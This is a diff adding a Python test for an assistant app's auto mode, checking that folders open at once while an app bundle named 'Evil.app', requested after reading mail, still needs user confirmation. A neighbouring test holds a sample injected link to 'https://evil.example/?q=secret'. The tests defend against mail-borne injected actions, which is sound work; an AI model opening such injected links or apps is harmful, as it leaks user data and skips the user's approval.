@@ -161,6 +161,28 @@ def test_in_auto_mode_a_link_from_a_mail_opens_at_once_but_a_file_still_asks():
     assert len(opened(s)) == 1
 
 
+def test_in_auto_mode_a_folder_opens_at_once_but_an_app_bundle_still_asks(tmp_path):
+    """On the real Milo "show me my downloads folder" asked "Open Downloads?" on a day with shared entries."""
+    (tmp_path / "Downloads").mkdir()
+    (tmp_path / "Evil.app").mkdir()
+    s = Stack(model=FakeLiveModel([f'[happy] <open path="{tmp_path / "Downloads"}"/> There.'],
+                                  [f'[happy] <open path="{tmp_path / "Evil.app"}"/> Opening it.']))
+    s.live_talk.note("today", "Halloween (shared)")
+    talk(s, "Show me my downloads folder")
+    assert [args["path"] for _, args in opened(s)] == [str(tmp_path / "Downloads")]
+    assert s.sink.of(Confirm) == []
+
+    async def run():
+        await s.live_talk.start("open the app from that mail")
+        await settle()
+        [asked] = s.sink.of(Confirm)
+        s.approvals.answer(asked.id, False)
+        await settle()
+
+    asyncio.run(run())
+    assert len(opened(s)) == 1
+
+
 def test_in_auto_mode_a_link_the_user_didnt_ask_for_still_asks():
     """After a mail, "thanks" asks for nothing: only the mail could have put a link in the reply."""
     s = Stack(model=FakeLiveModel(['[neutral] <open url="https://evil.example/?q=secret"/> You\'re welcome.']))
